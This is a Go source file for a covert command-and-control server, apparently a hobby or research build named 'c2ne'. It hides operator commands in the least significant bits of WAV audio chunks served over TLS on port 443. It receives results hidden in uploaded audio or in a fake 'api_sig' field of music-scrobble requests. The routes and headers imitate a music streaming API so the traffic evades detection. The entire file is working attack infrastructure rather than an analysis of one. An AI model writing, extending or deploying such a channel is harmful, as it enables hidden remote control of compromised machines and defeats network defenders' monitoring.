package main
import (
	"fmt"
	"net/http"
	"log"
	"sync"
	"context"
	"os"
	"os/signal"
	"syscall"
	"time"
	"crypto/tls"
	"flag"
	"strconv"
	//"bufio"
	"strings"
	"io"
	"encoding/json"
	"github.com/chzyer/readline"

)

const c2_server_ip = "0.0.0.0"
var firstLoopDone string = "false"
var (
	echo_to_stdout string
	cliMessageChan = make(chan string, 10)
	command string = ""
	pendingCommand string =""
	trackCache = map[string][]byte{}
)

/*var http_response_string = "HTTP/1.1 200 OK\r\n" +
	"Date: Wed, 29 Jul 2026 22:30:00 GMT\r\n" +
	"Server: Apache/2.4.41 (Ubuntu)\r\n" +
	"Content-Type: text/html; charset=UTF-8\r\n" +
	"Content-Length: 42\r\n" +
	"Connection: close\r\n" +
	"\r\n" +
	"<html><body><h1>It Works!</h1></body></html>"
*/

func invokeTlsListener(ctx context.Context, port string){
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Fatalf("[-] Failed to load TLS certificates: %v\n", err)
		<-ctx.Done()
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12, // Ensure compliance with modern security baselines
	}

	//Open the network transport layer port, i.e initiate tsl listener
	listener, err := tls.Listen("tcp", c2_server_ip+":"+port, config)
	if err != nil {
		log.Fatalf("Failed to initialize TLS listener: %v\n", err)
		<-ctx.Done()
	}
	defer listener.Close()
	go func() {
		<-ctx.Done()
		listener.Close()
	}()

	mux := http.NewServeMux()
	mux.HandleFunc("GET /api/v1/sample/chunk/", handleChunk) //prolly use a /api/v1/*/chunk to be able to take any music file name
	mux.HandleFunc("POST /api/v1/upload", handleUpload)
	mux.HandleFunc("POST /api/v1/sample/scrobble", handleScrobble)

	http.Serve(listener, mux)
}

var h *WavHeader
var ChunkSize int = 576
func handleChunk (w http.ResponseWriter, r *http.Request){
	idxStr := strings.TrimPrefix(r.URL.Path, "/api/v1/sample/chunk/")
	n, err := strconv.Atoi(idxStr)
	if err != nil {
		http.Error(w, "bad chunk index", http.StatusBadRequest)
		return
	}
	//prepare the music track
	var	baseAudioTrack []byte
	filename:="river_ship.wav" //TODO - logic to extract filename from urlpath
	if _,exists := trackCache[filename]; exists{
		baseAudioTrack=trackCache[filename]
	}else{
		trackCache[filename], err = os.ReadFile(filename)
		if err != nil {
			fmt.Printf("Fatal: '%v' doesnt exist: %v", filename, err)
			http.NotFound(w, r)
			return
		}
		baseAudioTrack=trackCache[filename]
		h, _ = parseWavHeader(baseAudioTrack)
	}	
	totalTrackBytes := len(baseAudioTrack)
	
	//576 Provides a precise 2ms network loop cadence
	//need to decide if we wanna encode on header or not, if not so, need a way to determine if the chunk is, infact header
	
	cmd_len_threshold := ChunkSize/8
	byteOffset := n*ChunkSize
	if n==0{
		byteOffset+= int(h.DataStart) //if it is the first chunk, dont include header in the chunk
	}
	isLastChunk := "false"
	ChunkSize = 2* int(h.SampleRate) * int(h.Channels) * int(h.BitsPerSample) /8
	//fmt.Println("2s ChunkSize", ChunkSize)
	chunk := make([]byte, ChunkSize)
	
	if byteOffset > totalTrackBytes{
		fmt.Println("416, out of bounds")
		http.Error(w, "range not satisfiable", http.StatusRequestedRangeNotSatisfiable) // 416
		return
	}
	num:=0
	if byteOffset+ChunkSize > totalTrackBytes {
		num =copy(chunk, baseAudioTrack[byteOffset:totalTrackBytes])
		isLastChunk="true"
		firstLoopDone="false"
	}else{
		num =copy(chunk, baseAudioTrack[byteOffset:byteOffset+ChunkSize])
	}

	//*********--encode message in the current chunk--******************//
	//---code for byte to bit conversion of cli commands
	if firstLoopDone == "true"{
		select {
		case cmd := <-cliMessageChan:
			command = cmd
			if len(command) > 0 {
				command = "STRT"+command+"STOP"
			}
			
			if len(pendingCommand)>0{
				command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
				pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]
			}
			if len(command)>cmd_len_threshold{
				pendingCommand += command[cmd_len_threshold:]
				command = command[:cmd_len_threshold]
			}

		default:
			if len(pendingCommand)>0{
				command = pendingCommand[:min(len(pendingCommand), cmd_len_threshold)]+command
				pendingCommand = pendingCommand[min(len(pendingCommand), cmd_len_threshold):]					
				//fmt.Printf("Injecting payload (%d characters)...\n", len(command)+8)
				goto label1
				//ensures pending msg gets sent, when there's no cli message but there's pending msg
			}

			//dont go through the whole thing of encoding, if we dont have any message to be sent.
			w.Header().Set("Content-Type", "audio/wav")
			w.Header().Set("Content-Length", strconv.Itoa(len(chunk[:num])))
			w.Header().Set("Cache-Control", "no-store")
			w.Header().Set("X-Last-Chunk", isLastChunk)
			w.Header().Set("Accept-Ranges", "bytes")

			w.Write(chunk[:num])

			byteOffset = byteOffset + ChunkSize;
			return
		}
label1 :

		var cmd_bitstring []string 
		for _, char := range command{
			if echo_to_stdout=="on"{
				fmt.Println("individual byte= ", char, " char= ", string(char)," bitstring ", fmt.Sprintf("%08b", char) )
			}
			cmd_bitstring = append(cmd_bitstring, fmt.Sprintf("%08b", char))
		}
		
		//----code to inject LSB from cmd_bitstring array into audio stream.
		cmd_bitIndex :=0
		cmd_charIndex :=0
		var audio_stegd_bytes []byte

		if echo_to_stdout=="on"{
			fmt.Println("Chunk length = ", len(chunk))
			fmt.Printf("Injecting payload (%d characters)...\n", len(command))
		}

		for _, aud_byte := range chunk{
			if cmd_charIndex == len(command) {
				if echo_to_stdout=="on"{
					fmt.Println("stegged bs length ",len(audio_stegd_bytes), "\nstegged bs ", audio_stegd_bytes)
				}
				break
			}

			ival, _ := strconv.Atoi(string(cmd_bitstring[cmd_charIndex][cmd_bitIndex]))
			aud_byte = aud_byte & 0xFE //0xFE is 11111110. So we clear the LSB
			aud_byte = aud_byte | byte(ival)

			audio_stegd_bytes= append(audio_stegd_bytes, aud_byte)

			cmd_bitIndex++
			if cmd_bitIndex==8{
				cmd_charIndex ++
				cmd_bitIndex =0
			}

		}

		//*********-------------------end------------------*****************//
		copy(chunk[:cmd_charIndex*8], audio_stegd_bytes[:cmd_charIndex*8])
	}
	w.Header().Set("Content-Type", "audio/wav")
	w.Header().Set("Content-Length", strconv.Itoa(len(chunk[:num])))
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("X-Last-Chunk", isLastChunk)
	w.Header().Set("Accept-Ranges", "bytes")
	w.Write(chunk[:num])

	byteOffset = byteOffset + ChunkSize
	command = ""

	if echo_to_stdout == "on"{
		fmt.Println("Log - ",time.Now()," Request recieved and Replied to ", "443")
	}
}

func handleUpload(w http.ResponseWriter, r *http.Request) {
    err := r.ParseMultipartForm(32 << 20) // 32MB memory threshold; larger spills to temp files on disk
    if err != nil {
        http.Error(w, "bad multipart form", http.StatusBadRequest)
        return
    }

    file, _, err := r.FormFile("file")
    if err != nil {
        http.Error(w, "missing file field", http.StatusBadRequest)
        return
    }
    defer file.Close()

    data, err := io.ReadAll(file)
    if err != nil {
        http.Error(w, "read failed", http.StatusInternalServerError)
        return
    }

 	//decode
 	go decodeEngine(data, len(data))
    w.Header().Set("Content-Type", "application/json")
    w.WriteHeader(http.StatusCreated)
    fmt.Fprintf(w, `{"status":"ok","id":"%s"}`, "11223344")
}

//helper struct for scrobble
type ScrobbleRequest struct{
	Method string `json:"method"`
	Timestamp string `json:"timestamp"`
	TrackID string `json:"track_id"`
	PlayedMs string `json:"played_ms"`
	//DurationMs string `json:"duration_ms"`
	ApiSig string `json:"api_sig"` //is where the output lies

}

func handleScrobble(w http.ResponseWriter, r *http.Request){

	var req ScrobbleRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	defer r.Body.Close()
	fmt.Println(req.ApiSig)
}
func decodeEngine (newAudioTrack []byte, size int){

	var fifo4 []byte
	var current_decoded_byte byte
	var decoded_op_byte []byte
	op_bitIndex := 0
	store_output :=0

	for _, stegd_byte := range(newAudioTrack[:len(newAudioTrack)]){		
		
		last_bit_str := fmt.Sprintf("%08b", stegd_byte)
		last_bit_int, _ := strconv.Atoi(string(last_bit_str[7]))
		//fmt.Println("stegd_byte = ", stegd_byte, " bitstring = ", last_bit_str, " last bit = ", last_bit_int)

		current_decoded_byte = (current_decoded_byte << 1) | byte(last_bit_int)

		op_bitIndex++
		if op_bitIndex==8{
			if store_output==1{
				decoded_op_byte = append(decoded_op_byte, current_decoded_byte)
			}
			fifo4 = append(fifo4, current_decoded_byte)
			if len(fifo4) > 4{
				fifo4 = fifo4[1:]
			}
			if "STRT"==string(fifo4){
				store_output = 1
			}
			if "STOP"==string(fifo4){
				store_output = 0
				finalOutput := strings.Replace(string(decoded_op_byte), "STOP", "", -1)
				decoded_op_byte = decoded_op_byte[:0]
				fmt.Println(finalOutput)
			}
			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
			op_bitIndex =0
			current_decoded_byte = 0
		}
	}
}

func convertByteToBits (the_byte byte ) ([8]byte){
	binary_string := fmt.Sprintf("%08b", the_byte)
	var the_bits [8]byte
	for i, bit := range binary_string{
		if bit == '0'{ 
			the_bits[i] = 0
		}else { the_bits[i] = 1}
	}
	return the_bits
}

func main() {
	fmt.Print("server started")

	debug := flag.String("debug", "off", "toggle debug mode - on or off")    
    flag.Parse()

    echo_to_stdout = *debug
    fmt.Println(" with debug", echo_to_stdout)
	port_list := []string{"443"}

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup
	
	go StartCLIConsole()

	for _, port := range port_list{
		wg.Add(1)
		go func (p string){
			defer wg.Done()
			 	go invokeTlsListener(ctx, p)
		}(port)
	}

	//graceful exit on ctrl+c --generated by ai
	// wait for Ctrl+C / SIGTERM
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	<-sigCh

	fmt.Println("shutting down...")
	cancel()   // tell listeners to stop
	wg.Wait()  // wait for them to actually close
	fmt.Println("shutdown complete")
}

// StartCLIConsole accepts asynchronous text inputs from operators
func StartCLIConsole() {
	fmt.Println("c2ne is active. Type a command and press Enter")
    rl, err := readline.New("c2ne> ")
    if err != nil {
        log.Fatal(err)
    }
    defer rl.Close()

    for {
        line, err := rl.Readline()
        if err == io.EOF || err == readline.ErrInterrupt {
            break
        }
        if err != nil {
            log.Println("read error:", err)
            continue
        }
        if line != "" {
			cliMessageChan <- line
		}
    }
}
			
